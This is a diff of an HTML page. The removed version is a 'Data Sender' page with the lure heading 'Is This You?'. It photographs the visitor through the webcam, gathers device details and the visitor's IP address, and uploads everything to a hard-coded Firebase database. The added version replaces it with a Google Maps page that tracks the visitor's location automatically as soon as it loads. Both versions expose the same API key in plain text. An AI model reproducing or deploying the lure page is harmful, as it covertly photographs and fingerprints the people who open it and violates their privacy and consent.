@@ -1,197 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Sender</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #121212;
-            color: #ffffff;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-        h1 {
-            color: #00ff00;
-            margin-top: 20px;
-        }
-        #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            color: #ffffff;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        #loading-message {
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .container {
-            margin: 20px auto;
-            max-width: 400px;
-        }
-        .button {
-            background-color: #00cc00;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.3s;
-            width: 100%;
-        }
-        .button:hover {
-            background-color: #009900;
-        }
-        .error-message {
-            color: #ff0000;
-            margin: 10px 0;
-        }
-        .info-message {
-            color: #ffff00;
-            margin: 10px 0;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Geolocation Tracker with Worker</title>
+  <style>
+    #map {
+      height: 100vh;
+    }
+  </style>
 </head>
 <body>
-    <div id="loading-screen">
-        <div id="loading-message">
-            <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
-        </div>
-    </div>
-    <div class="container">
-        <h1>Is This You?</h1>
-        <p>Data will be sent automatically.</p>
-        <button class="button" id="start-button">Start Process</button>
-        <div id="error-message" class="error-message"></div>
-        <div id="info-message" class="info-message"></div>
-    </div>
+  <div id="map"></div>
 
-    <script type="module">
-        const firebaseConfig = {
-            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4", // Your API Key
-            authDomain: "maptracker-7afb6.firebaseapp.com", // Your Auth Domain
-            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com", // Your Database URL
-            projectId: "maptracker-7afb6", // Your Project ID
-            storageBucket: "maptracker-7afb6.appspot.com", // Your Storage Bucket
-            messagingSenderId: "874600101063", // Your Messaging Sender ID
-            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2", // Your App ID
-            measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
+  <script>
+    let map, marker, worker;
+    let watchId = null;
+
+    // Initialize the map
+    function initMap() {
+      map = new google.maps.Map(document.getElementById('map'), {
+        center: { lat: -34.397, lng: 150.644 },
+        zoom: 15,
+      });
+    }
+
+    // Function to start geolocation tracking
+    function startTracking() {
+      if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            const userLocation = { lat: latitude, lng: longitude };
+
+            // Update map and marker
+            map.setCenter(userLocation);
+            if (!marker) {
+              marker = new google.maps.Marker({
+                position: userLocation,
+                map: map,
+                title: 'Your location',
+              });
+            } else {
+              marker.setPosition(userLocation);
+            }
+
+            // Send location to worker for further processing
+            if (worker) {
+              worker.postMessage({
+                lat: latitude,
+                lng: longitude,
+                timestamp: position.timestamp,
+              });
+            }
+          },
+          (error) => {
+            console.error("Geolocation error:", error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0,
+          }
+        );
+      } else {
+        alert("Geolocation is not supported by your browser.");
+      }
+    }
+
+    // Function to stop tracking
+    function stopTracking() {
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    }
+
+    // Create an inline web worker
+    function initWorker() {
+      const workerScript = `
+        self.onmessage = function(event) {
+          const { lat, lng, timestamp } = event.data;
+          console.log('Worker received location: Lat=' + lat + ', Lng=' + lng + ', Timestamp=' + timestamp);
+  
+          // Simulate heavy processing or data storage
+          // This example simply sends back the received data.
+          self.postMessage({
+            message: 'Location processed: Latitude: ' + lat + ', Longitude: ' + lng + ', at ' + new Date(timestamp).toLocaleTimeString(),
+          });
         };
+      `;
 
-        // Initialize Firebase
-        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
-        const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
+      // Create a blob from the worker script
+      const blob = new Blob([workerScript], { type: "application/javascript" });
+      worker = new Worker(URL.createObjectURL(blob));
 
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        
-        const loadingScreen = document.getElementById('loading-screen');
-        const errorMessage = document.getElementById('error-message');
-        const infoMessage = document.getElementById('info-message');
+      // Handle messages from the worker
+      worker.onmessage = (event) => {
+        console.log("Message from worker:", event.data.message);
+      };
+    }
 
-        document.getElementById('start-button').addEventListener('click', startProcess);
+    // Initialize map and worker on page load
+    window.onload = function () {
+      initMap();
+      initWorker();
+      startTracking(); // Start geolocation tracking
+    };
+  </script>
 
-        async function startProcess() {
-            errorMessage.innerHTML = ''; // Clear previous errors
-            infoMessage.innerHTML = ''; // Clear previous info messages
-            loadingScreen.style.display = 'flex'; // Show loading screen
-            
-            try {
-                // Get fake location for demo purposes (you can set fixed coordinates)
-                const position = { coords: { latitude: 40.7128, longitude: -74.0060 } }; // Example: New York City
-                
-                // Create a unique session ID
-                const sessionId = Date.now();
-
-                // Get device info
-                const deviceInfo = await getDeviceInfo();
-
-                // Upload location, screenshot, and device info to Firebase
-                await uploadSessionData(sessionId, position, deviceInfo);
-                
-            } catch (error) {
-                errorMessage.innerHTML = error.message;
-            } finally {
-                loadingScreen.style.display = 'none'; // Hide loading screen
-            }
-        }
-
-        // Function to take a screenshot from the camera
-        async function takeScreenshot() {
-            const video = document.createElement('video');
-            video.autoplay = true;
-
-            try {
-                // Access the camera
-                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
-            } catch (error) {
-                throw new Error("Unable to access the camera.");
-            }
-
-            document.body.appendChild(video); // Append video to the body to access the stream
-
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    video.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
-                    document.body.removeChild(video); // Clean up the video element
-                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
-                }, 1000); // Take the screenshot after 1 second
-            });
-        }
-
-        // Function to get device information
-        async function getDeviceInfo() {
-            const ipAddress = await getIpAddress();
-            return {
-                userAgent: navigator.userAgent,
-                deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // Number of logical processors
-                screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
-                language: navigator.language || 'en-US', // User language
-                platform: navigator.platform || 'N/A', // User platform
-                ipAddress: ipAddress // User IP address
-            };
-        }
-
-        // Function to get user's IP address using ipify API
-        async function getIpAddress() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        // Function to upload location, screenshot, and device info to Firebase
-        async function uploadSessionData(sessionId, position, deviceInfo) {
-            // Take a screenshot
-            const screenshot = await takeScreenshot();
-
-            const sessionData = {
-                latitude: position.coords.latitude || "Not Available",
-                longitude: position.coords.longitude || "Not Available",
-                timestamp: Date.now(),
-                screenshot: screenshot,
-                ...deviceInfo // Spread device info into session data
-            };
-            const dataRef = ref(database, 'sessions/' + sessionId);
-            await set(dataRef, sessionData);
-            console.log('Session data uploaded successfully');
-        }
-    </script>
+  <!-- Google Maps API -->
+  <script
+    async
+    defer
+    src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4&callback=initMap"
+  ></script>
 </body>
 </html>
